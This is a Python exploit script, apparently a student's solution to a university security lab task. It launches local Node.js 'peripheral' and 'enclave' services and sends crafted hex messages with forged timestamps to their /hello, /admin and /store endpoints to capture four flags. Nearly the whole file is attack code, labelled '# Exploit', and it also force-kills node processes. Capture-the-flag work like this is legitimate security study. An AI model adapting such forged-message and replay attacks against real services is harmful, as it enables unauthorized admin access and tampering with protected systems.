#from cryptodome import *
import os
import subprocess
import signal
from time import sleep
import code
import select
import time
import requests
from requests.exceptions import ConnectionError
import random

path = "/home/isl/t2/"
node_prefix = ""
#path = "/mnt/hgfs/VMwareMain/ETH/Lab/Module4/Task2/"
#node_prefix = "/home/toroto006/Downloads/node-v16.13.0-linux-x64/bin/"

enclave_uri = "http://127.0.0.1:37100"
peripheral_uri = "http://127.0.0.1:37200"
rand_it = ""

def cleanUp():
    os.system("pkill -9 node")

def setup(with_catching=True) -> subprocess.Popen:
    if with_catching:
        P = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}peripheral"], stdin=subprocess.PIPE,  stdout=subprocess.PIPE)
        E = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}enclave"], stdin=subprocess.PIPE,  stdout=subprocess.PIPE)
    else:
        P = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}peripheral"])
        E = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}enclave"])
    sleep(1)
    print("Setup done, let's now do the request")
    return P, E

def readuntil(w, s, name):
    line = ""
    while s not in line:
        line = w.stdout.readline().decode().rstrip()
        print(f"{name}<{line}")
    return s

def flag2_3():
    cleanUp()
    P, E = setup()
    # Exploit
    readuntil(P, "Store takes some time", "PwaitS")
    # 1636560351705$00
    ts = str(int(time.time()*1000))+"$00"
    assert len(ts) == 16
    msg = f'hello$0000000000{ts}0389289a839f8104a19535a57c60be21c2da9312df51308e0cd363ba82885b51111111111111111111111111111111112880ccda64f655478e053e178a2b4caf3441570c37c51e5eddeb4fd3f5a15d94653de7101e9c59229b666124029fc7d2dbf080223cc1e27635e9ea1f374e44bf86208d23fe97661d97ed63d5b1585afed679e7d2855f55d403e71c50ebe0390207d926be16293d3d2aa55e6ea6d9f013'
    assert len(msg) == 352
    headers = {
        'Content-Type': 'application/xml',
        'Content-Length': '352'
        }
    try:
        rep = requests.post(f"{peripheral_uri}/hello", data=msg, headers=headers)
        if rep.status_code == 200:
            print(f"P req returned {rep.text}")
        else:
            print(f"P got {rep}")
    except ConnectionError:
        print("ERROR: An error occurred")

def flag2_4():
    cleanUp()
    P, E = setup()
    # Exploit
    ts = str(int(time.time()*1000))+"$00"
    assert len(ts) == 16
    msg = f'admin$0000000000{ts}467bf17e91612440c0fb0cddb42e19631f675a7b0920f5434606e389667d074111111111111111111111110f1b130556af4a445d5bfee31c1fba656aefb089f10c026c75fc10bd6d5e501e435ca2061f7439810809ab69fa140077db71232044a31b010f6e405c086e499e0dc87d758ddfb7a4bc563719c11e063b744f5f91f9a375400ed9802b8f8bbce92701cea5e08cbb695293a6fe76bf77e9493ad8eab1'
    assert len(msg) == 352
    headers = {
        'Content-Type': 'application/xml',
        'Content-Length': '352'
        }
    try:
        rep = requests.post(f"{peripheral_uri}/admin", data=msg, headers=headers)
        if rep.status_code == 200:
            print(f"P req returned {rep.text}")
        else:
            print(f"P got {rep}")
    except ConnectionError:
        print("ERROR: An error occurred")

def flag2_2():
    cleanUp()
    P, E = setup(with_catching=False)
    # Exploit
    for i in range(10):
        ts = str(int(time.time()*1000))+"$00"
        msgs = [
            (f'store$0000000000{ts}2878b97f22115c59fbb3fb4b41564a6da24ecc24c48796195c1e42d5d0e5c7ae111111111111111111111111111111112880ccda64f655478e053e178a2b4cafda230f5afde3a2b3e0b8b1fab8932fb5a31a8733254af8eb083fd31fe7a10c364799ac5800ba50b75b32e01b2766953658320f6d1e4d99487824ae501104f85ce6a467afd899cdea1a7d091a1572e0d7f8e9c7906ba8fa066517fa3c167dce4f', 'store'),
            (f'store$0000000000{ts}16fd8ebd2e696dc2323d83ce491aafa0d63f74a40ea31f924159d041837955a2111111111111111111111111111111112880ccda64f655478e053e178a2b4cafda230f5afde3a2b3e0b8b1fab8932fb5f92247f1a61e1ff48c154a7d889c8a90230a7c1edede1ef3db4d4614116d152ba252906ad668420f46e3321f294cc29272e39c5d99004d5cd4fd63b148c87970f5ae3ddce9d30afa66298b53b414b316', 'store'),
        ]
        for msg, api in msgs:
            headers = {
            'Content-Type': 'application/xml',
            'Content-Length': '352'
            }
            try:
                rep = requests.post(f"{peripheral_uri}/{api}", data=msg, headers=headers)
                if rep.status_code == 200:
                    print(f"P<{rep.text.rstrip()}")
                elif rep.status_code == 404:
                    print(f"ERROR {rep}")
                else:
                    pass
                    #print(f"{who} ERROR: {rep}")
            except ConnectionError:
                print("ERROR: An error occurred")
        sleep(0.1)

def flag2_1():
    cleanUp()
    P, E = setup(with_catching=False)
    # Exploit
    ts = str(int(time.time()*1000))+"$00"
    msgs = [
        (f'store$0000000000{ts}16fd8ebd2e696dc2323d83ce491aafa0d63f74a40ea31f924159d041837955a2111111111111111111111111111111112880ccda64f655478e053e178a2b4cafda230f5afde3a2b3e0b8b1fab8932fb5f92247f1a61e1ff48c154a7d889c8a90230a7c1edede1ef3db4d4614116d152ba252906ad668420f46e3321f294cc29272e39c5d99004d5cd4fd63b148c87970f5ae3ddce9d30afa66298b53b414b316', 'store'),
        (f'store$0000000000{ts}16fd8ebd2e696dc2323d83ce491aafa0d63f74a40ea31f924159d041837955a2111111111111111111111111111111112880ccda64f655478e053e178a2b4cafda230f5afde3a2b3e0b8b1fab8932fb5f92247f1a61e1ff48c154a7d889c8a90230a7c1edede1ef3db4d4614116d152ba252906ad668420f46e3321f294cc29272e39c5d99004d5cd4fd63b148c87970f5ae3ddce9d30afa66298b53b414b316', 'store'),
        (f'store$0000000000{ts}16fd8ebd2e696dc2323d83ce491aafa0d63f74a40ea31f924159d041837955a2111111111111111111111111111111112880ccda64f655478e053e178a2b4cafda230f5afde3a2b3e0b8b1fab8932fb5f92247f1a61e1ff48c154a7d889c8a90230a7c1edede1ef3db4d4614116d152ba252906ad668420f46e3321f294cc29272e39c5d99004d5cd4fd63b148c87970f5ae3ddce9d30afa66298b53b414b316', 'store'),
    ]
    for msg, api in msgs:
        headers = {
        'Content-Type': 'application/xml',
        'Content-Length': '352'
        }
        try:
            rep = requests.post(f"{peripheral_uri}/{api}", data=msg, headers=headers)
            if rep.status_code == 200:
                print(f"P<{rep.text.rstrip()}")
            elif rep.status_code == 404:
                print(f"ERROR {rep}")
            else:
                pass
                #print(f"{who} ERROR: {rep}")
        except ConnectionError:
            print("ERROR: An error occurred")

def main():
    flag2_1()
    flag2_2()
    flag2_3()
    flag2_4()
    sleep(1)

if __name__ == "__main__":
    cleanUp()
    try:
        main()
    except Exception as e:
        print(e)
        print(f"An error occured in main!")
    finally:
        cleanUp()
    os.system("cd /home/isl/t2 && /home/isl/t2/run.sh")
    print("Exploit done")
    exit()
